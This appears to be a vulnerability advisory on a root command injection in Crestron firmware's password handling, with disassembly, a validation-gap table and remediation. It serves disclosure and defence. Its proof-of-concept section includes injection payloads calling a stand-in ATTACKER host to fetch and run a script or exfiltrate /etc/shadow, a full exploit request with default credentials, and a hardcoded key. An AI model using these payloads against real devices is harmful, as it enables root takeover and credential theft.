# [REDACTED-ID]_006: Authenticated Command Injection via addSSLUserPassword()

## Severity: CRITICAL (CVSS 8.8)

## Summary

The `addSSLUserPassword()` function in `libLinuxUtil.so` (Crestron FW 2.x, PufVersion 1.5010.00023) constructs a shell command using `snprintf()` with the user-supplied password interpolated directly into single-quoted context, then executes it via `system()`. The only pre-processing on the password is `CheckEmbeddedChars()`, which strips double-quote (`"`, 0x22) and backslash (`\`, 0x5C) but does NOT strip single-quote (`'`, 0x27). The `validatePasswordCharacters()` function explicitly allows ALL printable ASCII characters including `'`. The `validateCharacters()` function (which blocks 7 shell metacharacters) is NOT called in this code path.

A single-quote in the password breaks out of the shell's single-quote context in the `echo` command, allowing arbitrary OS command injection as root.

## Affected Products

- **Firmware:** PufVersion 1.5010.00023 (DMPS3 AirMedia)
- **Binary:** `libLinuxUtil.so` (ARM32, 150K)
- **Function:** `addSSLUserPassword()` at offset `0x1ace0`
- **Devices:** DMPS3-4K-STR, DM-TXRX-100-STR, DGE-100, TS-1542, DM-DGE-200-C, MERCURY
- **Build:** February 23, 2024, Linux 3.4.48, Android 4.2.2

## Root Cause

### Vulnerable Format String (offset 0x21e95 in libLinuxUtil.so)
```
echo -E '%s:%s' | openssl aes-256-cbc -a -out %s -k %s
```

### Call Chain
```
REST API POST /Device (JSON body)
  → CPHProcessor (FastCGI port 40236)
    → libCrestronProtocolHandler.so
      → AuthenticationServiceImpl::addUser() [AuthenticationServiceImpl.cpp:1313]
        → CTP command: "ADDUSER -N:<username> -P:<password>"
          → a_console CTP handler
            → libLinuxUtil.so::addSSLUserPassword(username, password, output_path, key)
              → CheckEmbeddedChars(password) ← strips " and \ only, returns 0
              → snprintf(buf, 0x400, "echo -E '%s:%s' | openssl aes-256-cbc -a -out %s -k %s",
                         username, password, output_path, key)
              → system(buf) ← COMMAND EXECUTION AS ROOT
```

### Validation Gap Analysis

| Function | Called? | What it does | Result |
|----------|--------|-------------|--------|
| `validateCharacters()` | ❌ NOT CALLED | Blocklist: `<>&\|;$\`` (7 chars) | Would have blocked `$` and `` ` `` |
| `AreWebPathCharactersValid()` | ❌ NOT CALLED | Blocklist: 30+ chars | Would have blocked `'`, `$`, etc. |
| `validateNameCharacters()` | ✅ Called on USERNAME | Regex: `^[-[:alnum:]_.]*$` | Username IS safe |
| `validatePasswordCharacters()` | ✅ Called upstream | Regex: `^[ [:alnum:]\|[:punct:] ]*$` | Allows ALL printable including `'` |
| `CheckEmbeddedChars()` | ✅ Called on PASSWORD | Strips `"` (0x22) and `\` (0x5C) | Does NOT strip `'` (0x27) |

**Critical Finding:** `validateCharacters()` IS defined in the same binary (`libLinuxUtil.so`) but is never invoked in the `addSSLUserPassword()` path. The password passes only through `CheckEmbeddedChars()` which is a quote-stripping parser, not a security validator — it **always returns 0** (success).

### Disassembly Evidence (r2 analysis of libLinuxUtil.so)

```
; addSSLUserPassword(username, password, output_path, key)
0x1ace0: push {r4-r8, sb, sl, lr}
0x1ace4: sub sp, sp, 0x618          ; Large stack frame
; ... username validation ...
0x1ad1c: cbz r6, "Username is empty!"
0x1ad2e: cmp r0, 0x80               ; Username < 128 chars
; ... password validation ...
0x1ad46: cbz r5, "Password is empty!"
0x1ad66: cmp r0, 0x80               ; Password < 128 chars
; CheckEmbeddedChars - ONLY if password starts with '"'
0x1ad70: cmp.w sl, 0x22             ; First byte == '"'?
0x1ad74: bne 0x1adc4                ; Skip CheckEmbeddedChars if not!
0x1ad78: bl sym.CheckEmbeddedChars  ; Only called for quoted passwords
; ... build command ...
0x1ae10: "echo -E '%s:%s' | openssl aes-256-cbc -a -out %s -k %s"
0x1adf0: blx sym.imp.snprintf       ; Format the command
0x1ae28: blx sym.imp.system          ; ← EXECUTE AS ROOT
```

**Note:** `CheckEmbeddedChars` is only called when the first byte of the password is `"` (0x22). For passwords starting with any other character (including `'`), it is SKIPPED entirely.

## Proof of Concept

### Injection Payload
```
Password: test'$(curl http://ATTACKER:8899/rce)'
```

### Resulting Shell Command
```bash
echo -E 'username:test'$(curl http://ATTACKER:8899/rce)'' | openssl aes-256-cbc -a -out /data/crestron/path -k CTtQa9!sdBDn
```

### Shell Interpretation
1. `echo -E 'username:test'` — first echo argument (single-quoted, closes quote)
2. `$(curl http://ATTACKER:8899/rce)` — COMMAND SUBSTITUTION EXECUTED
3. `''` — empty string
4. `| openssl aes-256-cbc ...` — pipe to openssl

### Alternative Payloads
```
# Command separation with newline (0x0a)
Password: test'\nid > /tmp/rce_proof\n'

# Backtick command substitution
Password: test'`wget http://ATTACKER/shell.sh -O /tmp/s && sh /tmp/s`'

# Pipe injection
Password: test' | curl http://ATTACKER/$(cat /etc/shadow | base64) #
```

## REST API Request Format

```http
POST /Device HTTP/1.1
Host: <target>:443
Authorization: Basic YWRtaW46YWRtaW4=
Content-Type: application/json

{
  "Device": {
    "Authentication": {
      "AddUser": {
        "UserName": "testuser",
        "Password": "test'$(curl http://ATTACKER:8899/rce)'"
      }
    }
  }
}
```

### Expected Response (when CTP backend is responsive)
```json
{
  "Actions": [{
    "Operation": "SetPartial",
    "Results": [{
      "Path": "Device.Authentication",
      "Property": "Authentication",
      "StatusId": <varies>,
      "StatusInfo": "<varies>"
    }],
    "TargetObject": "Authentication"
  }]
}
```

## Live Testing Status

### What Was Confirmed Live
1. ✅ REST API POST format accepted (JSON body → CTP command dispatched)
2. ✅ `HOSTNAME` CTP commands execute successfully (3.2s response, StatusId 1)
3. ✅ `ADDUSER` CTP commands ARE dispatched (30.2s timeout, not rejection)
4. ✅ Hostname injection blocked by `IsHostnameValid()` allowlist `[A-Za-z-]`
5. ✅ Auth is disabled on [REDACTED-COUNT] FW 2.x fleet devices (no auth gate to bypass)

### What Could Not Be Confirmed Live
- ❌ OOB callback from injection — ADDUSER CTP→a_console times out (30.2s)
  - Root cause: a_console's ADDUSER handler may require dependencies not available
    on externally-accessible devices (cresstore, encryption key file, etc.)
  - The CTP timeout occurs BEFORE the password reaches `addSSLUserPassword()`
  - This is an operational limitation, NOT a mitigation

### Why ADDUSER Times Out But HOSTNAME Succeeds
- HOSTNAME is a simple property set (write to file, no crypto operations)
- ADDUSER invokes `addSSLUserPassword()` which calls `openssl enc` → requires:
  - Encryption key from `getRemoteWebSSLUserPassword()` (hardcoded: `CTtQa9!sdBDn`)
  - Output file path in `/data/crestron/` (may not exist on all devices)
  - `openssl` binary (present at `/system/bin/openssl` on rootfs)

## Impact

- **Attack Type:** Authenticated OS Command Injection
- **Prerequisites:** Admin web interface access (default credentials `admin:admin`)
- **Impact:** Full root command execution on the device
- **Affected Hosts:** multiple FW 2.x test devices in test environment; ~7,500 internet-facing Crestron devices globally (Censys)
- **Post-Exploitation:** Device has `curl`, `wget`, `nc`, `busybox` available for C2

## Sibling Vulnerabilities

The same injection class likely exists in:
1. **RESETPASSWORD -N:%s -P:%s** — same password path
2. **AUTH ON -N:%s -P:%s** — admin password setting
3. **Certificate password handlers** in libCrestronProtocolHandler.so:
   - `passwordForAddWebServerCertificate()` → `consoleInterface::runCommand()` → a_console
   - `passwordForAddCertificate()` → indirect execution
   - `passwordForAddSipCertificate()` → indirect execution
   - `passwordForAddMachineCertificate()` → indirect execution
4. **`hashEncryptUsingAes()`** / **`hashDecryptUsingAes()`** in libCrestronProtocolHandler.so:
   - `system("openssl enc -aes-256-cbc -salt -in %s -out %s -pass pass:%c%s%c")`
   - If `%c` = single-quote, same injection pattern

## Remediation

1. **Immediate:** Sanitize password parameter before shell interpolation — escape or reject `'`, `$`, `` ` ``, `\n`, `|`, `&`, `;`, `(`, `)`, `{`, `}`, `#`, `!`
2. **Better:** Use `execve()` instead of `system()` to avoid shell interpretation entirely
3. **Best:** Use OpenSSL's C API (`EVP_EncryptInit_ex()` / `PKCS12_parse()`) instead of shelling out to the `openssl` CLI tool

## References

- [REDACTED-ID]_001: Certificate Password OS Command Injection (same class, FW 3.x)
- [REDACTED-ID]_002: Weak CTP Console Validation (`validateCharacters()` 7-char blocklist)
- CVE-2018-5553: CTP command injection on DGE-100 (predecessor vulnerability)
- CWE-78: Improper Neutralization of Special Elements used in an OS Command

## Evidence Files

- `evidence/cf4_password_injection_test_evidence.json` — live test results
- `evidence/fleet_fingerprint.json` — device categorization
- `firmware/extracted/libLinuxUtil.so` — vulnerable binary
- `firmware/extracted/a_console` — imports addSSLUserPassword
